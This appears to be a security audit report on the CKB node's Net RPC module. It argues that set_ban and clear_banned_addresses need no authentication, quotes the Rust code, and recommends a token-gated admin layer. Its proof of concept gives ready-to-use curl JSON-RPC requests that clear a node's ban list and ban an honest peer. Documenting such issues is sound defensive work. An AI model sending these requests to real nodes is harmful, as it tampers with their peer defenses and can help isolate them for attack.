### Title
Unauthenticated `set_ban` / `clear_banned_addresses` RPC Methods Allow Any Caller to Manipulate the Node's Network Ban List — (File: `rpc/src/module/net.rs`)

---

### Summary

The `set_ban` and `clear_banned_addresses` methods exposed by the CKB Net RPC module perform privileged network-management operations with no caller authentication or authorization check. Any entity that can reach the JSON-RPC endpoint — including an unprivileged local RPC caller or any remote client if the operator has exposed the port — can silently clear all IP bans or inject new bans, directly undermining the node's peer-filtering defenses. This is a structural missing-access-control issue: the RPC dispatch layer applies no per-method privilege check, so every method in an enabled module is equally reachable by every caller.

---

### Finding Description

**Root cause — no authorization gate on privileged Net RPC methods**

`rpc/src/module/net.rs` declares and implements two state-mutating methods with no authentication guard:

```rust
// Declaration — no modifier, no role check
#[rpc(name = "clear_banned_addresses")]
fn clear_banned_addresses(&self) -> Result<()>;
``` [1](#0-0) 

```rust
// Implementation — directly mutates network state, no caller check
fn clear_banned_addresses(&self) -> Result<()> {
    self.network_controller.clear_banned_addrs();
    Ok(())
}
``` [2](#0-1) 

```rust
fn set_ban(
    &self,
    address: String,
    command: String,
    ban_time: Option<Timestamp>,
    absolute: Option<bool>,
    reason: Option<String>,
) -> Result<()> {
    // parses address, then unconditionally calls
    // self.network_controller.ban(...) or .unban(...)
    // — no role or token check anywhere in this path
``` [3](#0-2) 

**Dispatch layer — no authentication at the HTTP handler level**

The central JSON-RPC handler `handle_jsonrpc` in `rpc/src/server.rs` deserializes the request and forwards it directly to `io.handle_call`. There is no HTTP-level token, session, or role check before dispatch:

```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    // ... parse JSON, then:
    let result = io.handle_call(call, T::default()).await;
``` [4](#0-3) 

The Net module is a standard, production-enabled module. The RPC documentation itself acknowledges the risk but relies entirely on network-level access restriction rather than any in-process authorization:

> "Allowing arbitrary machines to access the JSON-RPC port … is **dangerous and strongly discouraged**." [5](#0-4) 

**Exploit flow**

1. Attacker gains RPC access (local process on the same host, or remote if the operator has bound the RPC to a non-loopback address — a known real-world misconfiguration).
2. Attacker calls `clear_banned_addresses()` — all previously banned malicious peers are immediately re-admitted to the peer registry.
3. Attacker calls `set_ban("192.0.2.1", "insert", null, null, null)` — any legitimate peer IP can be banned without operator knowledge.
4. No credential, token, or signature is required at any step.

---

### Impact Explanation

- **Eclipse attack facilitation**: Clearing the ban list re-enables every previously evicted malicious peer. A targeted attacker who was banned after misbehavior (e.g., sending invalid headers, flooding proposals) is immediately re-admitted and can resume the attack.
- **Selective peer DoS**: Banning specific IPs severs the node's connections to chosen honest peers, isolating it from the honest network partition and making it susceptible to feeding of stale or adversarial chain tips.
- **Consensus integrity risk**: An eclipsed node accepts blocks only from attacker-controlled peers, enabling double-spend confirmation fraud against services that trust that node's view of the chain.
- **No audit trail**: The operation succeeds silently; the operator has no in-process notification that the ban list was tampered with.

---

### Likelihood Explanation

- The Net RPC module is enabled by default in production configurations.
- The RPC is bound to `127.0.0.1:8114` by default, but operators routinely expose it to broader networks (the documentation warning exists precisely because this happens).
- No credential is required — a single unauthenticated HTTP POST suffices.
- The attacker profile is a local RPC caller or any remote client with TCP access to the RPC port, both of which are explicitly listed as in-scope attacker roles.
- The call is trivial to craft: a standard JSON-RPC POST with method `clear_banned_addresses` and an empty params array.

---

### Recommendation

Introduce a per-method authorization layer in the RPC server. Specifically:

1. Add an optional bearer-token or HTTP Basic Auth check in `handle_jsonrpc` (or as an Axum middleware layer) that gates all state-mutating Net methods (`set_ban`, `clear_banned_addresses`, `add_node`, `remove_node`).
2. Alternatively, split the Net module into a read-only sub-module (always enabled) and a privileged admin sub-module (token-gated), following the same pattern already used to separate `IntegrationTest` from production modules.
3. At minimum, document that `set_ban` and `clear_banned_addresses` are admin-only operations and enforce this with a configurable secret token checked server-side before dispatch, rather than relying solely on network-level firewall rules.

---

### Proof of Concept

**Precondition**: RPC port reachable (locally or remotely). No credentials needed.

**Step 1 — Verify current ban list (optional)**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_banned_addresses","params":[]}'
# Returns list of currently banned IPs
```

**Step 2 — Clear all bans as an unprivileged caller**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"clear_banned_addresses","params":[]}'
# Returns: {"id":2,"jsonrpc":"2.0","result":null}
# All banned peers are now re-admitted — no auth required
```

**Step 3 — Ban a legitimate peer IP**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"set_ban","params":["<honest_peer_ip>","insert",null,null,"attacker"]}'
# Returns: {"id":3,"jsonrpc":"2.0","result":null}
# Honest peer is now banned — node is partially isolated
```

**Expected outcome**: Both calls succeed with HTTP 200 and `"result": null`. The node's peer ban state is fully controlled by the unauthenticated caller. The implementation at `rpc/src/module/net.rs:686-726` confirms no authorization check exists between the HTTP request and the `network_controller` mutation. [6](#0-5)

### Citations

**File:** rpc/src/module/net.rs (L286-287)
```rust
    #[rpc(name = "clear_banned_addresses")]
    fn clear_banned_addresses(&self) -> Result<()>;
```

**File:** rpc/src/module/net.rs (L686-726)
```rust
    fn clear_banned_addresses(&self) -> Result<()> {
        self.network_controller.clear_banned_addrs();
        Ok(())
    }

    fn set_ban(
        &self,
        address: String,
        command: String,
        ban_time: Option<Timestamp>,
        absolute: Option<bool>,
        reason: Option<String>,
    ) -> Result<()> {
        let ip_network = address.parse().map_err(|_| {
            RPCError::invalid_params(format!(
                "Expected `params[0]` to be a valid IP address, got {address}"
            ))
        })?;

        match command.as_ref() {
            "insert" => {
                let ban_until = if absolute.unwrap_or(false) {
                    ban_time.unwrap_or_default().into()
                } else {
                    unix_time_as_millis()
                        + ban_time
                            .unwrap_or_else(|| DEFAULT_BAN_DURATION.into())
                            .value()
                };
                self.network_controller
                    .ban(ip_network, ban_until, reason.unwrap_or_default());
                Ok(())
            }
            "delete" => {
                self.network_controller.unban(&ip_network);
                Ok(())
            }
            _ => Err(RPCError::invalid_params(format!(
                "Expected `params[1]` to be in the list [insert, delete], got {address}"
            ))),
        }
```

**File:** rpc/src/server.rs (L218-258)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;
```

**File:** rpc/README.md (L1-6)
```markdown
# CKB JSON-RPC Protocols

The RPC interface shares the version of the node version, which is returned in `local_node_info`. The interface is fully compatible between patch versions, for example, a client for 0.25.0 should work with 0.25.x for any x.

Allowing arbitrary machines to access the JSON-RPC port (using the `rpc.listen_address` configuration option) is **dangerous and strongly discouraged**. Please strictly limit the access to only trusted machines.

```
